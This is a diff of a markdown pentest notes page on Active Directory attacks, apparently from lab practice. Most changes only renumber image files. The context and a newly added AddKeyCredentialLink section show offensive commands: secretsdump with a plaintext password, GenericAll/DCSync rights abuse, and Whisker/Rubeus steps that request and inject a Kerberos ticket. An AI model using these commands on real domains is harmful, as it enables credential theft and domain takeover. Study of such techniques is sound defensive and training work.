@@ -532,7 +532,7 @@ runas /user:corp\jen powershell.exe
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   * ```powershell
     # Might need to migrate to sqlsvc process using metasploit
@@ -813,7 +813,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -897,7 +897,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -938,7 +938,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -1199,5 +1199,28 @@ setspn -T corp2.com -Q MSSQLSvc/*
     Console.WriteLine("[+] Command executed successfully on DC01.");
 
     ```
+
+</details>
+
+<details>
+
+<summary>Exploiting AddKeyCredentialLink</summary>
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)
+
+```
+Whisker.exe add /target:ZPH-SVRMGMT1$
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```
+Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ… /password:"zCixoq4fEBQBRvvE" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show /ptt
+klist
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 </details>
